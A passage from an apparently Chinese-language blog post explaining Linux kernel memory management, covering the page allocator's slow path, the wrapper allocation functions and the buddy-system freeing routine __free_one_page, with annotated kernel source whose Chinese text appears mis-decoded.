&amp; ALLOC_CPUSET) || reserve_flags) &#123;<br>ac-&gt;nodemask = <span class="hljs-literal">NULL</span>;<br>ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,<br>ac-&gt;highest_zoneidx, ac-&gt;nodemask);<br>&#125;<br><br><span class="hljs-comment">/* å¸¦ç€å¯èƒ½è°ƒæ•´è¿‡ zonelist ä¸ alloc_flags å†æ¬¡å°è¯• */</span><br>page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* è°ƒç”¨æ–¹ä¸æƒ³è¦å›æ”¶, æˆ‘ä»¬æ— æ³•å¹³è¡¡ä»»ä½•äº‹ */</span><br><span class="hljs-keyword">if</span> (!can_direct_reclaim)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/* é¿å…é€’å½’åœ°ç›´æ¥å›æ”¶ */</span><br><span class="hljs-keyword">if</span> (current-&gt;flags &amp; PF_MEMALLOC)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/* å°è¯•ç›´æ¥å›æ”¶ååˆ†é… */</span><br>page = __alloc_pages_direct_reclaim(gfp_mask, order, alloc_flags, ac,<br>&amp;did_some_progress);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* å°è¯•ç›´æ¥ compaction ååˆ†é… */</span><br>page = __alloc_pages_direct_compact(gfp_mask, order, alloc_flags, ac,<br>compact_priority, &amp;compact_result);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* è‹¥æ˜¯ç‰¹åˆ«æŒ‡å®šçš„è¯·æ±‚ï¼Œä¸è¦å¾ªç¯ */</span><br><span class="hljs-keyword">if</span> (gfp_mask &amp; __GFP_NORETRY)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä¸è¦é‡è¯•é«˜èŠ±é”€çš„é«˜é˜¶åˆ†é…é™¤éä»–ä»¬æ˜¯</span><br><span class="hljs-comment"> * __GFP_RETRY_MAYFAIL</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (costly_order &amp;&amp; !(gfp_mask &amp; __GFP_RETRY_MAYFAIL))<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-keyword">if</span> (should_reclaim_retry(gfp_mask, order, ac, alloc_flags,<br> did_some_progress &gt; <span class="hljs-number">0</span>, &amp;no_progress_loops))<br><span class="hljs-keyword">goto</span> retry;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥0é˜¶çš„å›æ”¶æ— æ³•å–å¾—ä»»ä½•è¿›å±•ï¼Œåˆ™é‡è¯• compaction æ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œ</span><br><span class="hljs-comment"> * å› ä¸ºå½“å‰å¯¹ compaction çš„å®ç°æ˜¯åŸºäºæœ‰è¶³å¤Ÿçš„ç©ºé—²å†…å­˜çš„</span><br><span class="hljs-comment"> *  (å‚è§ __compaction_suitable)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (did_some_progress &gt; <span class="hljs-number">0</span> &amp;&amp;<br>should_compact_retry(ac, order, alloc_flags,<br>compact_result, &amp;compact_priority,<br>&amp;compaction_retries))<br><span class="hljs-keyword">goto</span> retry;<br><br><br><span class="hljs-comment">/* åœ¨æˆ‘ä»¬å¼€å§‹ OOM killing ä¹‹å‰å¤„ç†å¯èƒ½çš„ cpuset æ›´æ–°ç«äº‰ */</span><br><span class="hljs-keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac))<br><span class="hljs-keyword">goto</span> retry_cpuset;<br><br><span class="hljs-comment">/* å›æ”¶å¤±è´¥äº†, å¼€å§‹ killing ä¸€äº›ä¸œè¥¿ */</span><br>    <span class="hljs-comment">// è¦æ€ä¸€äº›è¿›ç¨‹æˆ–æ˜¯åˆ«çš„ä¸œè¥¿æ¥è…¾å†…å­˜äº†</span><br>page = __alloc_pages_may_oom(gfp_mask, order, ac, &amp;did_some_progress);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* åœ¨æ— å°½çš„å¾ªç¯ä¸­é¿å…æ²¡æœ‰æ°´ä½çº¿çš„åˆ†é… */</span><br><span class="hljs-keyword">if</span> (tsk_is_oom_victim(current) &amp;&amp;<br>    (alloc_flags &amp; ALLOC_OOM ||<br>     (gfp_mask &amp; __GFP_NOMEMALLOC)))<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/* è‹¥ OOM killer å–å¾—äº†ä¸€äº›æˆæ•ˆï¼Œé‡è¯• */</span><br><span class="hljs-keyword">if</span> (did_some_progress) &#123;<br>no_progress_loops = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><br>nopage:<br><span class="hljs-comment">/* åœ¨æˆ‘ä»¬å¤±è´¥ä¹‹å‰å¤„ç†å¯èƒ½çš„ cpuset çš„æ›´æ–°ç«äº‰ */</span><br><span class="hljs-keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac))<br><span class="hljs-keyword">goto</span> retry_cpuset;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç¡®ä¿ __GFP_NOFAIL è¯·æ±‚æ²¡æœ‰æ³„éœ²ä¸”ç¡®ä¿æˆ‘ä»¬ä¸€ç›´åœ¨é‡è¯•</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (gfp_mask &amp; __GFP_NOFAIL) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ‰€æœ‰å­˜åœ¨çš„ __GFP_NOFAIL ç”¨æˆ·éƒ½æ˜¯å¯ä»¥è¢«é˜»å¡çš„, </span><br><span class="hljs-comment"> * æ•…å¯¹ä»»ä½•æ–°çš„å®é™…ä¸Šéœ€è¦ GFP_NOWAIT çš„ç”¨æˆ·è¿›è¡Œè­¦å‘Š</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(!can_direct_reclaim))<br><span class="hljs-keyword">goto</span> fail;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è¿™ä¸ªä¸Šä¸‹æ–‡çš„ PF_MEMALLOC è¯·æ±‚éå¸¸å¥‡æ€ª</span><br><span class="hljs-comment"> * å› ä¸ºæˆ‘ä»¬ä¸èƒ½å›æ”¶ä»»ä½•ä¸œè¥¿åªèƒ½å¾ªç¯ç­‰å¾…</span><br><span class="hljs-comment"> * æŸäººæ¥ä¸ºæˆ‘ä»¬åšäº›ä»€ä¹ˆ</span><br><span class="hljs-comment"> */</span><br>WARN_ON_ONCE(current-&gt;flags &amp; PF_MEMALLOC);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ— å¤±è´¥çš„é«˜å¼€é”€çš„ orders æ˜¯ä¸€é¡¹è‰°å·¨çš„è¦æ±‚ï¼Œ</span><br><span class="hljs-comment"> * æˆ‘ä»¬å¯¹æ­¤å¹¶æ²¡æœ‰å¤ªå¤šå‡†å¤‡ï¼Œæ•…è®©æˆ‘ä»¬è­¦å‘Šè¿™äº›ç”¨æˆ·</span><br><span class="hljs-comment"> * ä»¥ä¾¿äºæˆ‘ä»¬èƒ½å¤Ÿè¯†åˆ«å‡ºä»–ä»¬å¹¶å°†ä¹‹è½¬åŒ–ä¸ºåˆ«çš„ä¸œè¥¿</span><br><span class="hljs-comment"> */</span><br>WARN_ON_ONCE(order &gt; PAGE_ALLOC_COSTLY_ORDER);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * é€šè¿‡è®©ä»–ä»¬èƒ½è®¿é—®ä¿ç•™çš„å†…å­˜æ¥å¸®åŠ©éå¤±è´¥çš„åˆ†é…</span><br><span class="hljs-comment"> * ä½†ä¸ä½¿ç”¨ ALLOC_NO_WATERMARKS å› ä¸ºè¿™å¯èƒ½</span><br><span class="hljs-comment"> * å¤§é‡å‡å°‘å†…å­˜ä¿ç•™åŒºè€Œè®©æƒ…å†µæ›´å</span><br><span class="hljs-comment"> */</span><br>page = __alloc_pages_cpuset_fallback(gfp_mask, order, ALLOC_HARDER, ac);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br>cond_resched();<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br>fail:<br>warn_alloc(gfp_mask, ac-&gt;nodemask,<br><span class="hljs-string">&quot;page allocation failure: order:%u&quot;</span>, order);<br>got_pg:<br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å…ˆè¡¥å……ä¸€ä¸ªæ¦‚å¿µâ€”â€”<code>Memory compaction</code> æœºåˆ¶ï¼Œå…¶å®å°±æ˜¯æ•´ç†å†…å­˜ç¢ç‰‡ï¼Œå¯¹é›¶æ•£çš„å†…å­˜é¡µè¿›è¡Œè¿ç§»ï¼Œä»è€Œå°†é›¶æ•£çš„ç©ºé—²å†…å­˜é¡µå˜æˆå¤§å—çš„ç©ºé—²å†…å­˜ï¼Œä¸è¿‡è¿™é‡Œåªæ•´ç†å¯ä»¥ç§»åŠ¨çš„ç¢ç‰‡ï¼š</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="ä»çŸ¥ä¹å·çš„å›¾.png"></p><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹æ…¢é€Ÿåˆ†é…çš„æ•´ä¸ªæµç¨‹ï¼š</p><ul><li>ä½¿ç”¨åŸæœ‰çš„ gfp_flag é‡æ–°è®¾ç½® alloc_flagï¼Œå¹¶é‡æ–°è®¡ç®— preferred zoneï¼Œè‹¥è®¾ç½®äº† <code>ALLOC_KSWAPD</code> åˆ™è°ƒç”¨ <code>wake_all_kswapds()</code> å”¤é†’ kswapd çº¿ç¨‹è¿›è¡Œå†…å­˜å›æ”¶</li><li>ä¹‹åé‡æ–°å°è¯•å¿«é€Ÿè·¯å¾„çš„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>æ¥ä¸‹æ¥è°ƒç”¨ <code>__alloc_pages_direct_compact()</code> è¿›è¡Œ compactionï¼Œè¯¥å‡½æ•°å†…éƒ¨åœ¨æ•´ç†å®Œåä¼šé‡æ–°å°è¯•å¿«é€Ÿè·¯å¾„çš„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>ï¼ˆretryï¼‰æ¥ä¸‹æ¥è°ƒç”¨ <code>wake_all_kswapds()</code> å”¤é†’ kswapd çº¿ç¨‹è¿›è¡Œå†…å­˜å›æ”¶</li><li>è°ƒæ•´ zonelist ä¸ alloc_flagï¼Œä¹‹åå†æ¬¡å°è¯•å¿«é€Ÿè·¯å¾„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>è‹¥ gfp_flag ä¸­æ²¡æœ‰ <code>__GFP_DIRECT_RECLAIM</code> æˆ–æ˜¯è¿›ç¨‹ PCB çš„ flag ä¸­æœ‰ <code>PF_MEMALLOC</code>ï¼Œç›´æ¥è·³è½¬åˆ° ï¼ˆnopageï¼‰</li><li>è°ƒç”¨ <code>__alloc_pages_direct_reclaim()</code> è¿›è¡Œå†…å­˜å›æ”¶ï¼ˆå†…éƒ¨è°ƒç”¨ <code>__perform_reclaim()</code>ï¼‰ä¸å¿«é€Ÿè·¯å¾„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>è°ƒç”¨ <code>__alloc_pages_direct_compact()</code> è¿›è¡Œ compaction ä¸å¿«é€Ÿè·¯å¾„åˆ†é…ï¼Œè‹¥æˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>å¦‚æœè®¾ç½®äº† <code>__GFP_NORETRY</code> ï¼Œæˆ–æ˜¯è¯¥æ¬¡å†…å­˜åˆ†é…å¼€é”€è¾ƒé«˜ï¼ˆ<code>order &gt; PAGE_ALLOC_COSTLY_ORDER</code>ï¼‰ä¸”æœªè®¾ç½® <code>__GFP_RETRY_MAYFAIL</code>ï¼Œç›´æ¥è·³åˆ° ï¼ˆnopageï¼‰</li><li>è°ƒç”¨ <code>should_reclaim_retry()</code> åˆ¤æ–­æ˜¯å¦éœ€è¦é‡æ–°å›æ”¶ï¼Œè‹¥æ˜¯åˆ™è·³å›ï¼ˆretryï¼‰</li><li>è°ƒç”¨ <code>should_compact_retry()</code> åˆ¤æ–­æ˜¯å¦éœ€è¦é‡æ–°è¿›è¡Œ compactionï¼Œè‹¥æ˜¯åˆ™è·³å›ï¼ˆretryï¼‰</li><li>è°ƒç”¨ <code>check_retry_cpuset()</code> æ£€æŸ¥ cpuset æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼Œè‹¥æ˜¯åˆ™è·³è½¬å›å¼€å¤´</li><li>è°ƒç”¨ <code>__alloc_pages_may_oom()</code> å°è¯• kill ä¸€äº›è¿›ç¨‹æ¥é‡Šæ”¾å†…å­˜ï¼Œè¯¥å‡½æ•°å†…é¦–å…ˆè¿˜æ˜¯ä¼šå…ˆè¿›è¡Œä¸€æ¬¡å¿«é€Ÿåˆ†é…ï¼Œä¹‹åæ‰æ˜¯è°ƒç”¨ <code>out_of_memory()</code> æ¥æ€æ‰æœ€é€‚åˆçš„è¿›ç¨‹ä»¥é‡Šæ”¾å†…å­˜ï¼Œæœ€åè‹¥è®¾ç½®äº† <code>__GFP_NOFAIL</code> åˆ™è°ƒç”¨ <code>__alloc_pages_cpuset_fallback()</code> å†æ¬¡å°è¯•å†…å­˜åˆ†é…ï¼Œåœ¨è¯¥å‡½æ•°ä¸­ä¼šä¸¤æ¬¡èµ°å¿«é€Ÿè·¯å¾„è¿›è¡Œåˆ†é…ï¼ˆç¬¬ä¸€æ¬¡ä¼šé¢å¤–é™„åŠ ä¸Š <code>ALLOC_CPUSET</code> çš„ flagï¼‰</li><li>å¦‚æœæŠŠå½“å‰è¿›ç¨‹æ€æ‰äº†ï¼Œè·³åˆ°ï¼ˆnopageï¼‰ï¼›å¦‚æœæ€è¿›ç¨‹å–å¾—äº†æˆæ•ˆï¼Œè·³å›ï¼ˆretryï¼‰</li><li>ï¼ˆnopageï¼‰è°ƒç”¨ <code>check_retry_cpuset()</code> æ£€æŸ¥ cpuset æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼Œè‹¥æ˜¯åˆ™è·³è½¬å›å¼€å¤´</li><li>è‹¥è®¾ç½®äº† <code>__GFP_NOFAIL</code> åˆ™è¿›è¡Œä¸€ç³»åˆ—çš„è­¦å‘Šï¼Œå¹¶è°ƒç”¨ <code>__alloc_pages_cpuset_fallback()</code> å†æ¬¡å°è¯•å†…å­˜åˆ†é…ï¼Œè‹¥æœªæˆåŠŸåˆ™è·³å›ï¼ˆretryï¼‰</li><li>è¿”å›ç»“æœ</li></ul><p><img src="https://s2.loli.net/2022/07/06/eCg12KJIZuw9aon.png" alt="image.png"></p><h2 id="å››ã€ä¸Šå±‚å°è£…åˆ†é…å‡½æ•°">å››ã€<em>ä¸Šå±‚å°è£…åˆ†é…å‡½æ•°</em></h2><p>åœ¨ <code>__alloc_pages_nodemask()</code> ä¸Šå±‚ä¸»è¦æœ‰ä¸‰ä¸ªé¡µé¢åˆ†é…å‡½æ•°ï¼Œå…¶è°ƒç”¨è·¯å¾„å¦‚ä¸‹ï¼š</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__alloc_pages_node</span>  <span class="hljs-comment">/*è¿”å›struct pageçš„æŒ‡é’ˆ*/</span><br>    <span class="hljs-variable">__alloc_pages</span><br>    <span class="hljs-variable">__alloc_pages_nodemask</span><br><br>alloc_pages         <span class="hljs-comment">/*è¿”å›struct pageçš„æŒ‡é’ˆ*/</span><br>    alloc_pages_current<br>    <span class="hljs-variable">__alloc_pages_nodemask</span><br>        <br><span class="hljs-variable">__get_free_pages</span>    <span class="hljs-comment">/*è¿”å›é¡µé¢çš„è™šæ‹Ÿåœ°å€*/</span><br>    <span class="hljs-variable">__get_free_pages</span><br>    alloc_pages<br>            alloc_pages_current<br>            <span class="hljs-variable">__alloc_pages_nodemask</span><br></code></pre></td></tr></table></figure><h1>0x03.é¡µçš„é‡Šæ”¾</h1><p>å‰é¢æˆ‘ä»¬è®²äº†é¡µé¢æ˜¯å¦‚ä½•åˆ†é…çš„ï¼Œç°åœ¨æˆ‘ä»¬æ¥çœ‹é¡µé¢æ˜¯å¦‚ä½•é‡Šæ”¾çš„</p><h2 id="ä¸€ã€-free-one-page-ï¼šé‡Šæ”¾é¡µé¢çš„æ ¸å¿ƒå‡½æ•°">ä¸€ã€__free_one_page()ï¼šé‡Šæ”¾é¡µé¢çš„æ ¸å¿ƒå‡½æ•°</h2><p>è¯¥å‡½æ•°æ˜¯ buddy system ä¸­ç”¨ä»¥è¿›è¡Œé¡µé¢é‡Šæ”¾çš„<strong>æ ¸å¿ƒå‡½æ•°</strong>ï¼Œæ‰€æœ‰çš„é¡µé¢é‡Šæ”¾ API éƒ½æ˜¯åŸºäºè¯¥å‡½æ•°çš„å°è£…</p><p>è¯¥å‡½æ•°å®šä¹‰äº <code>/mm/page_alloc.c</code> ä¸­ï¼Œä¸»è¦ä½œç”¨æ˜¯å°†ç‰¹å®šé¡µé¢é‡Šæ”¾åˆ°ç‰¹å®š zone ä¸Šï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œçš„ <code>one page</code> ä¸æ˜¯ä¸€å¼ é¡µæ¡†è€Œæ˜¯ä¸€å—è¿ç»­å†…å­˜ï¼ˆå¯èƒ½æœ‰å¤šå¼ é¡µï¼‰</p><p>è¿˜éœ€è¦æ³¨æ„çš„æ˜¯è¿™æ˜¯ä¸€ä¸ªé‡Šæ”¾é¡µé¢çš„<strong>åŸºæœ¬å‡½æ•°</strong>ï¼Œæ•…æˆ‘ä»¬éœ€è¦æä¾›å¾…é‡Šæ”¾é¡µé¢çš„é¡µç»“æ„ä½“ï¼ˆstruct pageï¼‰ã€é¡µæ¡†å·ã€é¡µé¢å—çš„é˜¶ï¼ˆorderï¼‰ã€ç›®æ ‡ zoneã€è¿ç§»ç±»å‹ç­‰ä¿¡æ¯â€”â€”è¿™äº›ä¿¡æ¯é€šå¸¸ç”±ä¸Šå±‚å°è£…å‡½æ•°æä¾›ï¼Œè¿™ä¸ªå‡½æ•°æ‰€åšçš„åªæ˜¯ç®€å•åœ°å°†é¡µæŒ‚å›å¯¹åº”é“¾è¡¨å¹¶æ£€æŸ¥åˆå¹¶çš„æ“ä½œ</p><p>å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * buddy system åˆ†é…å™¨çš„é‡Šæ”¾å‡½æ•°.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * buddy system çš„æƒ³æ³•æ˜¯ä¸ºå¤šç§â€œordersâ€çš„å†…å­˜å—</span><br><span class="hljs-comment"> * ç»´æŠ¤ä¸€ä¸ªç›´æ¥æ˜ å°„è¡¨ï¼ˆåŒ…å«ä½å€¼ï¼‰. åº•éƒ¨çº§åˆ«çš„è¡¨åŒ…å«</span><br><span class="hljs-comment"> * å¯¹æœ€å°çš„å¯åˆ†é…å†…å­˜å•å…ƒï¼ˆè¿™é‡Œä¾¿æ˜¯é¡µé¢ï¼‰çš„æ˜ å°„,</span><br><span class="hljs-comment"> * è€Œå¾€ä¸Šæ¯æ›´é«˜ä¸€çº§åˆ™æè¿°äº†ä»å…¶ä¸‹çš„ä¸€çº§çš„ä¸€å¯¹å•å…ƒï¼Œå› æ­¤æ˜¯&quot;buddies&quot;.</span><br><span class="hljs-comment"> * ä»é«˜å±‚çœ‹ï¼Œè¿™é‡Œæ‰€åšçš„ä»…æ˜¯åœ¨æ ‡è®°åº•å±‚å¯ç”¨çš„è¡¨é¡¹ï¼Œ</span><br><span class="hljs-comment"> * å¹¶æ ¹æ®éœ€è¦å‘ä¸Šä¼ æ’­æ›´æ”¹ï¼Œå†åŠ ä¸Šä¸€äº›ä¸ VM ç³»ç»Ÿçš„å…¶ä»–éƒ¨åˆ†</span><br><span class="hljs-comment"> * è‰¯å¥½åä½œæ‰€éœ€è¦çš„è®¡æ•°ã€‚</span><br><span class="hljs-comment"> * åœ¨æ¯ä¸ªçº§åˆ«, æˆ‘ä»¬éƒ½ä¿æŒä¸€ä¸ª pages çš„ list, ä½œä¸ºè¿ç»­çš„</span><br><span class="hljs-comment"> * é•¿åº¦ä¸º(1 &lt;&lt; order)çš„ç©ºé—²é¡µçš„å¤´èŠ‚ç‚¹å¹¶æ ‡è®°ä¸Š PageBuddy.</span><br><span class="hljs-comment"> * Page&#x27;s order è¢«è®°å½•åœ¨ page_private(page) åŸŸ.</span><br><span class="hljs-comment"> * æ•…å½“æˆ‘ä»¬åœ¨åˆ†é…æˆ–é‡Šæ”¾å…¶ä¸€æ—¶, æˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦ä¸€ä¸ªçš„çŠ¶æ€ã€‚</span><br><span class="hljs-comment"> * ä¹Ÿå°±æ˜¯è¯´ï¼Œè‹¥æˆ‘ä»¬åˆ†é…ä¸€ä¸ªå°çš„å—ï¼Œè€Œä¸¤ä¸ªéƒ½æ˜¯ç©ºé—²çš„ï¼Œ</span><br><span class="hljs-comment"> * åŒºåŸŸçš„å‰©ä½™éƒ¨åˆ†å¿…é¡»è¢«åˆ†å‰²æˆå—. è‹¥ä¸€ä¸ªå—è¢«é‡Šæ”¾äº†ï¼Œ</span><br><span class="hljs-comment"> * è€Œä»–çš„ buddy ä¹Ÿæ˜¯é—²ç½®çš„, é‚£ä¹ˆè¿™å°†è§¦å‘åˆå¹¶æˆä¸€ä¸ªæ›´å¤§çš„å—</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * -- nyc</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> __free_one_page(<span class="hljs-keyword">struct</span> page *page,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pfn,<br><span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,<br><span class="hljs-type">int</span> migratetype, <span class="hljs-type">fpi_t</span> fpi_flags)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">capture_control</span> *<span class="hljs-title">capc</span> =</span> task_capc(zone);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> buddy_pfn;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> combined_pfn;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_order;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">buddy</span>;</span><br><span class="hljs-type">bool</span> to_tail;<br><br>    <span class="hljs-comment">// è¿™é‡Œçš„ MAX_ORDER å’Œ pageblock_order éƒ½æ˜¯å®</span><br>max_order = <span class="hljs-type">min_t</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, MAX_ORDER - <span class="hljs-number">1</span>, pageblock_order);<br><br>VM_BUG_ON(!zone_is_initialized(zone));<br>VM_BUG_ON_PAGE(page-&gt;flags &amp; PAGE_FLAGS_CHECK_AT_PREP, page);<br><br>VM_BUG_ON(migratetype == <span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (likely(!is_migrate_isolate(migratetype)))<br>__mod_zone_freepage_state(zone, <span class="hljs-number">1</span> &lt;&lt; order, migratetype);<br><br>VM_BUG_ON_PAGE(pfn &amp; ((<span class="hljs-number">1</span> &lt;&lt; order) - <span class="hljs-number">1</span>), page);<br>VM_BUG_ON_PAGE(bad_range(zone, page), page);<br><br>continue_merging:<br><span class="hljs-keyword">while</span> (order &lt; max_order) &#123;<br><span class="hljs-keyword">if</span> (compaction_capture(capc, page, order, migratetype)) &#123;<br>__mod_zone_freepage_state(zone, -(<span class="hljs-number">1</span> &lt;&lt; order),<br>migratetype);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>buddy_pfn = __find_buddy_pfn(pfn, order);<span class="hljs-comment">// è®¡ç®— buddy é¡µæ¡†å·</span><br>buddy = page + (buddy_pfn - pfn);<span class="hljs-comment">// è®¡ç®— buddy çš„é¡µç»“æ„ä½“ï¼Œæ³¨æ„è¿™é‡Œæ˜¯æŒ‡é’ˆåŠ æ³•</span><br><br><span class="hljs-keyword">if</span> (!pfn_valid_within(buddy_pfn)) <span class="hljs-comment">// é¡µæ¡†å·åˆæ³•æ€§æ£€æŸ¥</span><br><span class="hljs-keyword">goto</span> done_merging;<br><span class="hljs-keyword">if</span> (!page_is_buddy(page, buddy, order))  <span class="hljs-comment">// æ£€æŸ¥ page å’Œ buddy æ˜¯å¦æ˜¯ä¸€å¯¹</span><br><span class="hljs-keyword">goto</span> done_merging;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬çš„ buddyï¼ˆè¯‘æ³¨ï¼šé‡Šæ”¾é¡µé¢çš„â€œé…å¯¹â€é¡µé¢ï¼Œå¯ä»¥çœ‹å¼€å¤´çš„æ³¨é‡Šï¼‰ æ˜¯ç©ºé—²çš„</span><br><span class="hljs-comment"> * æˆ–å…¶ä¸º CONFIG_DEBUG_PAGEALLOC çš„ guard pageï¼Œ</span><br><span class="hljs-comment"> * ä¸å…¶åˆå¹¶åå‡åˆ°é«˜ä¸€çº§çš„orderã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (page_is_guard(buddy))<br>clear_page_guard(zone, buddy, order, migratetype);<br><span class="hljs-keyword">else</span><br>del_page_from_free_list(buddy, zone, order);<br>combined_pfn = buddy_pfn &amp; pfn;<br>page = page + (combined_pfn - pfn);<br>pfn = combined_pfn;<br>order++;<br>&#125;<br><span class="hljs-keyword">if</span> (order &lt; MAX_ORDER - <span class="hljs-number">1</span>) &#123;<br><span class="hljs-comment">/* è‹¥æˆ‘ä»¬åˆ°äº†è¿™ï¼Œè¿™æ„å‘³ç€ order &gt;= pageblock_order.</span><br><span class="hljs-comment"> * æˆ‘ä»¬æƒ³è¦é¢„é˜²åœ¨å¸¸è§„ pageblock ä¸ç‹¬ç«‹çš„pageblock ä¹‹é—´çš„åˆå¹¶ã€‚</span><br><span 